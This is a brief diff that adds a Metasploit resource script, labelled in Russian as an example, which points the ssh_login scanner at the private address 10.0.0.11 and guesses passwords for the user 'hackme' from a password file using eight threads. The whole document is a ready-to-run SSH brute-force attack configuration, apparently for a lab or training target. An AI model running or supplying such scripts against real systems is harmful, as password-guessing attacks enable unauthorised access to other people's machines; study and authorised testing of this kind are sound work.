@@ -1,0 +1,7 @@
+# Metasploit resource script (пример)
+setg RHOSTS 10.0.0.11
+use auxiliary/scanner/ssh/ssh_login
+set USERNAME hackme
+set PASS_FILE /root/passwords.txt
+set THREADS 8
+run
